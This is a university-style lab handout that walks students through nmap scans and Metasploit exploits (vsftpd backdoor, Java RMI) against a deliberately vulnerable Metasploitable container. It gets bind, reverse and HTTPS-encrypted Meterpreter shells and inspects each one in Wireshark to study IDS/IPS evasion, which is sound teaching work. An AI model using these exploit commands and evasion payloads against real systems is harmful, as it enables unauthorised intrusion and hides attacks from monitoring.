---
title: "Lab 06"
author: "Constantine Macris"
date: "25FEB2020"
subject: "IDS IPS Testing and Evasion"
subtitle: "Controls, what controls"
titlepage: true
titlepage-color: "3C9F53"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
top-level-division: chapter
---

# Lab 06 IDS IPS Evasion and testing

## Learning Outcomes

* Analyze and decipher network traffic, identify anomalous or malicious activity and assess impact on system (NWF)

## Background

## Lab Setup

* Ensure that the W4SP lab is setup and ready to use. Reference Lab 03 for setup:

### Get the latest VM

* Install [Vagrant](https://www.vagrantup.com/downloads.html)
* Open Powershell
* Make Directory for the lab VM (`mkdir w4sp-lab`)
* Download vargrant box

```bash
vagrant box add --box-version 0.1.0 --force thedini/w4sp
```

* Start box with `vagrant init thedini/w4sp` followed by `vagrant up`

```bash
vagrant init thedini/w4sp
vagrant up
```

### Startup the VM

1) Start the VM called w4sp-lab if it has not already started, you may need to open virtualbox to open the Window.
2) Log into the vm with the following credentials

```bash
user: w4sp-lab
pass: cns2020
```

3) Allow your user to access Wireshark with `sudo usermod -a -G wireshark $USER`
4) **Logout or restart and log back in to let the account changes take effect**
5) Inside the VM you will need to startup the environment, right click and select "terminal" to open a terminal. Once in the terminal issue the following commands:

```bash
cd /home/w4sp-lab/w4sp-lab
sudo python w4sp_webapp.py
```

NOTE: There have been some continuing issues with container management for example the "sploit" container may or may not gracefully remove itself and you will be left with an error like "docker: Error response from daemon: Conflict. The container name "/sploit" is already in use by container 'xxxxxx'..." to help resolve this issue issue the following command in a **new** terminal to remove the container, the xxxxxx is the hash of the container.

```bash
sudo docker rm xxxxxxx
```

## Setup Lab Environent

1) Open the VMs browser and go to http://127.0.0.1:5000
2) Click the red "setup" button to setup the default lab environment
3) Find the red buttons on the right and select the Metasploitable Image labeled "start sploit" (it may take a moment to download the required Docker images)
4) After the process has finished loading you will be able to reload the browser and see the **sploit** node added

## Recon that ftp box

1) The first thing we would want to do is to see what is open on the target system in this case lets just look at **ftp1**. Find its' IP from the network map.
2) Launch an nmap scan from Kali Linux against the **ftp1** machine, first thing you need is to discover the IP address of **ftp1** by hovering over the node or clicking in to the node's terminal and using the command **`ifconfig`**. NOTE: You may find that newer version of Linux doesn't have ifconfig installed and require use of **`ip addr`**
3) Lets watch the scan in Wireshark, launch wireshark and start watching on the **w4sp_lab** interface
4) Run the scan **`nmap -v -A 192.100.200.106`** where that IP address is your IP for **ftp1**

When the scan completes save your scan for later reference and note the ports that are open on **ftp1**

## Recon that Metasploitable box

1) Hover over the sploit node and get the IP address of the host. If this doesn't work you can always click into the terminal for that node and use the **`ifconfig`** command to find the IP address for the machine (should be 10.100.200.x)
2) The first thing we would want to do is see what is open on the target system. Use the previous commands to scan the **sploit** box.

## Launch Metasploit on Kali

1) Start the Metasploit console as root on your Kali Linux VM using the command: `sudo msfconsole` The **`msf >`** will appear shortly

### VSFTP Exploit

1) Search the VSFTP exploit using **`search vsftpd`**. Note the path to the exploit: `/exploit/unix/ftp/vsftpd_234_backdoor`
2) Use the exploit with **`use exploit/unix/ftp/vsftpd_234_backdoor`** and note the console prompt change to indicate you are using the module (remember tab complete is your friend)
3) Lets set some variables required for this module like **RHOST**. Use the command **`set RHOST 10.100.200.x`** where the IP address is the target host sploit's IP address
4) Launch the exploit with **`exploit`**

Did the exploit start? If it did, did it succeed? Was the exploit able to create a session? Since we already know that this server has this vulnerability we need to figure out why we are unable to establish a session. Lets dig a little deeper with Wireshark.

![Failed Exploit Attempt](https://cga.sfo2.digitaloceanspaces.com/cns/images/Screenshot%20from%202020-02-24%2017-34-00.png)

In my example you can see that my failed attempt is marked by a reset

![Working](https://cga.sfo2.digitaloceanspaces.com/cns/images/Screenshot%20from%202020-02-24%2017-37-08.png)

If at first you don't succeed try, try again. Once we get the timing to work out you an see that I issue a command to find out what user I am on the system by issuing the command **`whoami`**. You can see in in the packet capture

![whoami](https://cga.sfo2.digitaloceanspaces.com/cns/images/Screenshot%20from%202020-02-24%2017-36-49.png)

Finally we can look at the capture of the response telling us who we are logged into the shell as! **ROOT**

![I AM ROOT](https://cga.sfo2.digitaloceanspaces.com/cns/images/Screenshot%20from%202020-02-24%2017-39-45.png)

![I AM GROOT](https://external-preview.redd.it/pE7JvUfre09sQBtsRp1uenw0a7Rb15bAQfJ1A5dkw2M.png?auto=webp&s=ef0f97c45a4ddfa176e287bf8ac47a0104bfd7f4)

### Scanning with Metasploit

We are going to be starting a scan with Metasploit and issuing a command that does not require the same 3 way handshake that nmap did. To do this we are going to issue a **SYN** scan which means we are not going to complete the 3 way handshake but send a SYN packet and see if we will get **ACK** or **RST** packages back to determine the state of the port and gather the same data as the **nmap** scan. To do this we are going to use a module in Metasploit under **`auxiliary/scanner/portscan/syc`**

1) In the Metasploit console select the ports scan command using **`use auxiliary/scanner/portscan/syc`**
2) Lets look at the options on this command with **`show options`** command
3) Here we see the details on the SYN scan we are about to launch against out Metasploitable host these parameters can be adjusted as needed to customize a scan as needed.
4) If you remember we need to add the RHOST IP address before we can launch this scan. Check your "sploit" IP address by hovering over the host in the web interface or click on the host to issue the `ifconfig` command in the host shell. Mine is 10.100.200.143
5) Finally launch the scan with exploit. See the code below

```bash
set RHOST 10.10.200.143 #Set the host to scan
exploit
```

6) This scan will hit the first 10000 ports as we saw when we issued the `show options` command. Note the open ports on the "sploit" machine. So many service so little time to exploit them all, since we don't have time to investigate and interrogate each open service to determine vulnerabilities we are just going to exploit some, trust me, ok don't trust me just cross your fingers...

### Create a Bind Shell

We are going to exploit a Java RMI vulnerability on the remote machine to enable connection via the Meterpreter remote console. Take a moment to read about the exploit from [null-byte](https://null-byte.wonderhowto.com/how-to/exploit-java-remote-method-invocation-get-root-0187685/)

1) Lets **start a packet capture** before the exploit so we can dissect what is happening. (open Wireshark and start a capture)
2) The Java RMI is exploitable, trust me or not, the exploit is available as part of Metasploit under **`/exploit/multi/misc/java_rmi_server`**. The following, replacing the RHOST IP with your IP for "sploit"

```bash
use exploit/multi/misc/java_rmi_server
set RHOST 10.100.200.143
set PAYLOAD java/meterpreter/bind_tcp
show options
exploit
```

You will notice that your msf command changes to "meterpreter", meaning that Metaspolit creates Java based shell called the Meterpreter using the `bind_tcp` version of that shell. The first state of that shell binds to a TCP port that waits for a Metasploit payload to be delivered. In short we have a access on the remote machine. Confirm this by listing the directories with **`ls`** or **`getuid`** to get your user id on the remote system.

3) Now lets take a look at how the exploit went down. Look at your packet capture, specifically the traffic going over the RMI port 1099 (filter on **`tcp.port == 1099`**). When you find a packet that looks interesting, right click on it and look at the TCP stream. Do you find a URL? What is that URL? What port is it pointing to? What IP is it pointing to?

4) From the prior discover in #9 we see that we are connecting to port 8080, lets filter on **`tcp.port == 8080`** to follow this lead. Right click on these packets to look into what is happening. What is this capture showing?

5) Check the shell port 4444 in the same manner by filtering on **`tcp.port == 4444`** and observe what appears to be happening. In the bottom of the "follow TCP stream" window you will find a way to observe the stream in **HEX dump** switch to that view. Can you put together how the exploit works from all you have seen?

6) Return to the meterpreter and exit the exploit with **`exit`** as well as stop your capture.

Take a look at the hex dump and try to note what happened during the exploit, in what order did it happened in?

Lets take a moment to read about the difference between a shell and the Meterpreter. A shell is the raw access to the remote shell. Like having a local shell but... remote. Meterpreter helps by wrapping some common routines so it is easy to complete routine tasks. Take a look at some of these resources.

* [Meterpreter Cheat Sheet](https://www.blueliv.com/downloads/Meterpreter_cheat_sheet_v0.1.pdf)
* [SANS Cheat Sheet](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)

### Challenge -- Make a Firewall Rule

The intent has been to make a firewall rule on the "sploit" machine but I have not been successful getting that working. If you want give it a try by issuing the following command on the "sploit" machine. Make sure to adjust the -i value of **eth0** to appropriate interface name and test out the above exploit to see that it blocks the connection on port 4444 (the goal is that it should)

```bash
sudo iptables -A INPUT -i eth0 -p tcp --destination-port 4444 -j DROP
```

### Setting up a Reverse Shell

Last section we used a bind shell to gain access to the system. This time we are going to use a different payload: a reverse TCP listener or reverse shell.

1) Return to Metasploit and get to the point where you are ready to set your payload.
2) Type **`set PAYLOAD`** and hit TAB to see the different payloads available.
3) From the payloads select **`java/meterpreter/reverse_tcp`** and verify your options with **`show options`** (if needed set your RHOST again to the sploit IP address)
4) Because we are setting up a reverse connection, we see we need to set a LHOST (or a host that is going to be listening). Set your LHOST to your Kali IP address.
5) Lets **start a packet capture** before the exploit so we can dissect what is happening. (open Wireshark and start a capture)
6) Launch your exploit with **`exploit`**
7) You should get access on the Meterpreter shell and can verify your access by issuing the command **`getuid`**
8) Stop your packet capture and lets take a look

Try to put together what you are seeing in the packet capture. How does it differ from the bind shell we obtained above? If we had set a firewall in the Challenge would it have blocked the outbound connection on 4444 being established?

Looking at the traffic, would you be able to find any indication or strings that would indicate your attack that could be blocked by a NIPS/HIPS?

We have been using TCP packets so everything is in plain-text that we are seeing. What if we encrypted the traffic, do you think we could get around a NIPS? What do we commonly use to encrypt traffic across a network at the application layer? **HTTPS**

### Reverse shell with HTTPS

Lets try to carry out the same exploit this time using HTTPS so we can **HIDE** our traffic and keep a lower profile.

1) Return to the java_rmi_server exploit in MSF
2) Set payload, this time find the **`reverse_https`** from the list of payloads
3) Enter **`show options`** to see if we need any other settings set. It looks like we do, lets set our **LPORT to 4444**
4) Lets **start a packet capture** before the exploit so we can dissect what is happening. (open Wireshark and start a capture)
5) Launch your exploit with **`exploit`**
6) You should get access on the Meterpreter shell and can verify your access by issuing the command **`getuid`**
7) Stop your packet capture and lets take a look.

Do you continue to see traces of your attack? Can you pick out what specific strings are in the traffic showing the tools you are using?

## Wrapping up

Take a moment to look at your results and get an idea of who an IPS could filter the attacks you made. Do the following self learning on your own:

1) Use a port scanner other than nmap to probe the entire lab network. Gather as much information you can from the devices on the network
2) Launch different types of scans from the Metasploit console search for **`portscan`** to get a list of scanners and identify the difference between the ACK, SYN, TCP and other scans.
3) Explore [Metasploitable](https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide) to learn about how to exploit web applications.
